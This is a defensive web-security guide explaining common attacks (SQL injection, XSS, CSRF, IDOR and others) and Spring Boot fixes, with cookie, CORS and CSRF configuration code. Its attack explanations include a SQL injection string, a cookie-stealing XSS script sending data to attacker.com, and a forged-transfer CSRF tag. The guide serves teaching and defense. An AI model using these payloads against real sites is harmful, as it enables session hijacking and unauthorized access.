# Web Security Attacks & Spring Boot Security Defenses

This guide explains the most common web security attacks (including the OWASP Top 10), how they work step-by-step, and how to defend against them using Spring Boot and Spring Security.

---

## Part 1: Common Web Security Attacks & Fixes

Here is how each attack happens in the real world and the exact code or strategy to fix it.

---

### 1. SQL Injection (SQLi)

#### How the Attack Happens
Imagine your database login query looks like this on the backend:
```java
String query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";
```
An attacker inputs the following string into the username field:
```text
' OR '1'='1
```
The backend concatenates this input, and the final SQL query executed by the database becomes:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password=''
```
Because `'1'='1'` is always true, the database returns the first user row (usually the administrator) without verifying a password. The attacker logs in successfully. Attackers can also use this technique to delete databases or read sensitive tables.

#### The Fix
Always use **parameterized queries** or a secure ORM (like Spring Data JPA). This ensures user input is treated as *literal data*, never as executable SQL.

```java
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);
```

---

### 2. Cross-Site Scripting (XSS)

#### How the Attack Happens
Imagine your application has a public comment section. A normal user posts:
```text
Nice article!
```
An attacker posts a comment containing malicious JavaScript:
```html
<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
```
If your application saves this comment in the database and renders it raw on the screen for other visitors, their browsers will execute the script. The script silently reads the victim's session cookies and sends them to the attacker's server, allowing the attacker to hijack their session.

#### The Fix
* **Escape and sanitize** all user-generated content before rendering it in HTML.
* Avoid using raw input insertion APIs (e.g., in React, avoid `dangerouslySetInnerHTML` unless input is thoroughly sanitized).
* Implement a **Content-Security-Policy (CSP)** header so the browser blocks inline scripts from unauthorized third-party domains.
* Spring Security automatically includes protective headers (like `X-XSS-Protection`) in its default responses.

---

### 3. Cross-Site Request Forgery (CSRF)

#### How the Attack Happens
Suppose you are logged into `mybank.com` in one browser tab. In another tab, you visit a malicious site `evil.com`. That site has hidden code that triggers a request to the bank:
```html
<img src="https://mybank.com/transfer?amount=5000&to=attackerAccount">
```
When the browser attempts to load the image, it automatically attaches your active `mybank.com` session cookies. The bank server sees a valid session and processes the transaction without realizing you did not initiate it.

#### The Fix
* Require a random, unpredictable **CSRF token** for every state-changing request (POST, PUT, DELETE). The server validates this token. A malicious external site cannot read or guess this token.
* Use `SameSite=Lax` or `SameSite=Strict` cookie configurations.
* *Note: Stateless APIs using the `Authorization: Bearer <JWT>` header are naturally protected from CSRF because browsers do not attach custom headers automatically.*

---

### 4. Broken Authentication

#### How the Attack Happens
This usually occurs in two scenarios:
1. **Weak Password Storage**: Storing passwords in plain text or using outdated hashing algorithms (like MD5). If the database leaks, all passwords are exposed instantly.
2. **Session ID in URL**: Appending session IDs to URLs (e.g., `https://example.com/dashboard?sessionId=12345`). Attackers can read this from browser history, shared links, or network logs to hijack the account.

#### The Fix
* Hash passwords using strong, salted algorithms like **BCrypt**.
* Never put session IDs or security tokens in URLs. Store them in secure, `HttpOnly` cookies or pass them in HTTP headers.
* Set appropriate token expiration times and rotate refresh tokens.

```java
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}
```

---

### 5. Broken Access Control / IDOR (Insecure Direct Object Reference)

#### How the Attack Happens
You are logged in as user `101`. To view your invoice, your frontend calls:
```http
GET /api/orders/501
```
Out of curiosity, you change the URL to:
```http
GET /api/orders/502
```
If the backend only checks "is the user logged in?" but fails to verify "does order 502 belong to user 101?", you will see another user's private order details.

#### The Fix
Ensure every resource-fetching endpoint verifies ownership, not just authentication. Use Spring Security annotation-based checks:

```java
@PreAuthorize("#userId == authentication.principal.id")
public Order getOrder(Long userId, Long orderId) { 
    // Additional database checks to verify orderId belongs to userId
}
```

---

### 6. Security Misconfiguration

#### How the Attack Happens
* **Open Actuator Endpoints**: Leaving developer tools like Spring Boot Actuator (`/actuator/env` or `/actuator/heapdump`) open to the public in production. Attackers can access these to extract database passwords and API keys.
* **Exposing Stack Traces**: Displaying raw Java stack traces to end-users on error pages, revealing internal file structures, database tables, and library versions.
* **Default Credentials**: Not changing default administrator usernames and passwords (`admin/admin`) upon deployment.

#### The Fix
* Secure or disable unnecessary Actuator endpoints in production:
  ```properties
  management.endpoints.web.exposure.include=health
  ```
* Disable stack traces on user-facing error pages.
* Force a password change on all default administrative accounts.

---

### 7. Sensitive Data Exposure

#### How the Attack Happens
* **No Encryption in Transit**: Running your login API over plain HTTP. An attacker on the same local network (like a public cafe WiFi) can use a packet sniffer (like Wireshark) to read passwords in plain text.
* **API Data Leaks**: Serializing an entire database Entity class (containing `password` or `ssn` fields) directly to JSON, making them visible in the browser's developer network tab.

#### The Fix
* Enforce **HTTPS** globally (redirect all HTTP requests to HTTPS).
* Use `@JsonIgnore` or dedicated DTOs (Data Transfer Objects) to exclude sensitive fields from API responses.
  ```java
  @JsonIgnore
  private String password;
  ```

---

### 8. Using Components with Known Vulnerabilities

#### How the Attack Happens
Your project imports an outdated third-party library (like the infamous Log4j version vulnerable to *Log4Shell*). Attackers scan public-facing servers, send a specially crafted exploit payload in a request header, and execute arbitrary commands on your host server.

#### The Fix
* Conduct regular security scans on your dependencies (using tools like GitHub Dependabot, Snyk, or OWASP Dependency-Check).
* Regularly upgrade libraries and framework versions.

---

### 9. Insufficient Logging & Monitoring

#### How the Attack Happens
An attacker attempts a brute-force attack, trying 10,000 passwords over a weekend. Because your application only logs successful events, the attack goes completely unnoticed. The attacker eventually succeeds and steals data, leaving no audit logs to help you trace the breach.

#### The Fix
* Log both successful and failed authentication attempts.
* Configure security alerts for anomalies (e.g., "5+ failed login attempts from the same IP address in 1 minute").
* Stream logs to a secure, centralized log management platform.

---

### 10. Brute Force & Credential Stuffing

#### How the Attack Happens
Attackers obtain a leaked list of emails and passwords from a breach on a completely different website. Knowing that users reuse passwords, they write a script to automatically test thousands of these credentials against your login page.

#### The Fix
* Implement IP-based and account-based rate limiting (using libraries like `Bucket4j`).
* Implement a CAPTCHA challenge after multiple failed login attempts.
* Require Multi-Factor Authentication (MFA).

---

### 11. Man-in-the-Middle (MITM)

#### How the Attack Happens
A user connects to a public WiFi network where an attacker has configured a rogue hotspot or is intercepting traffic. If your application communicates over plain HTTP, the attacker intercepts the network traffic, reading and modifying data as it travels between the browser and the server.

#### The Fix
* Enforce **HTTPS/TLS** with strong cipher suites.
* Include the **HTTP Strict Transport Security (HSTS)** header to force browsers to interact with your site only via secure HTTPS connections.

---

### 12. Insecure Deserialization

#### How the Attack Happens
Your Spring Boot application accepts serialized Java objects directly from external clients (using `ObjectInputStream`). An attacker sends a modified, malicious byte stream. When your server attempts to deserialize it back into a Java object, it triggers remote code execution.

#### The Fix
* Avoid native Java object serialization for untrusted inputs.
* Use safe data exchange formats like JSON or XML with strict schema validation.

---

### 13. Distributed Denial of Service (DDoS)

#### How the Attack Happens
An attacker utilizes a botnet (thousands of infected computers) to flood your server with millions of requests simultaneously, consuming all CPU, memory, and bandwidth. The server crashes, and legitimate users are unable to access your application.

#### The Fix
* Deploy your application behind a Web Application Firewall (WAF) or CDN (such as Cloudflare) to filter out malicious flood traffic.
* Implement rate limiting at the API gateway or load balancer level.

---

## Part 2: Storing Session Tokens: Cookies vs. LocalStorage

When building a stateless application using JWTs, how you store the token in the browser dictates which attacks you are vulnerable to.

### What is a Cookie?
A cookie is a key-value pair that a server tells the browser to store via the `Set-Cookie` header. Once saved, the browser **automatically attaches** this cookie to every subsequent HTTP request to that same domain.

```text
Server Response: Set-Cookie: jwt=token123
Browser: Stores cookie
Subsequent Request: Sends Cookie: jwt=token123 automatically
```

---

### Key Cookie Security Attributes
You can secure cookies by attaching the following attributes:

* **`HttpOnly`**: Blocks JavaScript (`document.cookie`) from reading the cookie. This protects the token from XSS theft.
* **`Secure`**: Enforces that the cookie is only sent over encrypted HTTPS connections.
* **`SameSite`**: Restricts when cookies are sent on cross-site requests:
  * `Strict`: The cookie is never sent on cross-site requests (even clicking a link from an email to your site will exclude the cookie).
  * `Lax` (Default in modern browsers): The cookie is excluded on background cross-site requests (like image loads or forms triggered by third-party sites) but is sent during top-level navigations.
  * `None`: The cookie is sent on all cross-site requests (requires the `Secure` flag).

---

### The Storage Trade-Off: LocalStorage vs. HttpOnly Cookies

| Feature | JWT in `localStorage` + Header | JWT in `HttpOnly` Cookie |
| :--- | :--- | :--- |
| **XSS Vulnerability** | 🔴 **High** - Injected JS can instantly read and steal the token. | 🟢 **Low** - JavaScript cannot access the token, preventing theft. |
| **CSRF Vulnerability** | 🟢 **None** - Malicious sites cannot read local storage or add custom auth headers. | 🔴 **Real** - The browser auto-attaches cookies, requiring CSRF defenses. |
| **Mobile Integration** | 🟢 **Easy** - Fits native headers naturally. | 🟡 **Complex** - Mobile apps do not have a default cookie container. |
| **CORS Setup** | 🟢 **Simple** - Standard header verification. | 🟡 **Complex** - Requires matching credentials configurations. |

### Which is Best?
For a **browser-based SPA (React/Angular) talking to its own backend**, the recommended industry standard is:
> **Store the JWT in an `HttpOnly` + `Secure` + `SameSite=Lax` Cookie, and re-enable CSRF protection.**
XSS is highly common; keeping tokens out of `localStorage` protects you from token theft. The resulting CSRF vulnerability is easily fixed using a standard CSRF token pattern.

---

## Part 3: Cross-Domain Cookie Rules

When your frontend and backend run on different domains, you must configure both sides to allow cookies to flow.

### 1. Who owns the cookie?
The cookie is owned by the domain of the server that sent the `Set-Cookie` header (i.e., your **backend API**). The frontend's URL does not dictate where the cookie is stored.

### 2. Frontend Axios Config
Axios does not send or accept cookies on cross-origin requests by default. You must configure it:
```javascript
const api = axios.create({
  baseURL: "https://api.myproject.com",
  withCredentials: true // Required to send and receive cookies cross-origin
});
```

### 3. Backend Spring Boot CORS Config
If the frontend sends credentials (cookies), the backend CORS configuration must explicitly trust the origin and enable credentials:
```java
CorsConfiguration config = new CorsConfiguration();
config.setAllowedOrigins(List.of("https://app.myproject.com")); // Must be exact origin, NEVER "*"
config.setAllowCredentials(true); // Required to accept cross-domain cookies
```

### 4. The Domain Attribute
By default, a cookie is restricted to the exact domain that set it. You can broaden this to include subdomains by setting the `Domain` attribute:
```http
Set-Cookie: jwt=...; Domain=myproject.com
```
This allows the cookie to be sent to `api.myproject.com`, `app.myproject.com`, and any other subdomain of `myproject.com`.

---

## Part 4: Implementing Cookies & CSRF in Spring Boot

Here is the configuration required to implement a secure cookie-based auth structure in Spring Boot.

### 1. Spring Security CSRF Configuration
Enable CSRF using a cookie repository that JS can read, allowing your frontend to read the token and echo it back in a custom header (e.g., `X-XSRF-TOKEN`).

```java
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
);
```

### 2. Generating the JWT Cookie on Login
In your authentication endpoint, construct and return the cookie in the HTTP headers instead of the response body:

```java
ResponseCookie jwtCookie = ResponseCookie.from("jwt", token)
    .httpOnly(true)       // Hides token from JS (blocks XSS theft)
    .secure(true)         // Requires HTTPS
    .sameSite("Lax")      // Blocks cross-site CSRF requests
    .path("/")
    .maxAge(Duration.ofMinutes(15))
    .build();

response.addHeader(HttpHeaders.SET_COOKIE, jwtCookie.toString());
```

### 3. Extracting the JWT from the Cookie in Filters
Your authentication filter must extract the token from the request cookie array:

```java
@Override
protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) 
        throws ServletException, IOException {
        
    String token = null;
    if (request.getCookies() != null) {
        token = Arrays.stream(request.getCookies())
            .filter(cookie -> "jwt".equals(cookie.getName()))
            .map(Cookie::getValue)
            .findFirst()
            .orElse(null);
    }

    if (token != null && jwtService.validateToken(token)) {
        // Set authentication context...
    }
    filterChain.doFilter(request, response);
}
```

---

## Part 5: Production Security Checklist

To secure your production Spring Boot application, verify that your architecture implements this checklist:

1. **Same Parent Domain**: Run frontend and backend on subdomains of the same parent (e.g., `app.site.com` and `api.site.com`) to keep cookies in the safer `SameSite=Lax` space.
2. **Short-Lived Access Token**: Store the access JWT in an `HttpOnly` + `Secure` + `SameSite=Lax` cookie (expires in 15 minutes).
3. **Dedicated Refresh Token**: Store a refresh token in a separate `HttpOnly` cookie scoped only to your `/refresh` endpoint. Implement rotation and reuse detection.
4. **CSRF Enabled**: Use Spring Security CSRF tokens to secure POST/PUT/DELETE endpoints.
5. **Secure Hashing**: Use BCrypt for password hashing and enforce account lockouts after multiple failed attempts.
6. **Rate Limiting**: Apply rate limiters (e.g., using `Bucket4j`) on sensitive endpoints like `/login` and `/refresh`.
7. **Access Control**: Use method-level annotations (like `@PreAuthorize`) to verify resource ownership for every request.
8. **Parameterized Queries**: Never write concatenated SQL; use JPA/Hibernate parameter bindings to block SQL injection.
9. **Security Headers**: Enforce CSP, HSTS, and frame options.
10. **Locked Down Actuators**: Restrict actuator access to internal health checks only, and never expose stack traces to client environments.
11. **Logging & Monitoring**: Log authentication failures, monitor metrics, and utilize dependency checking tools in your CI/CD pipeline.
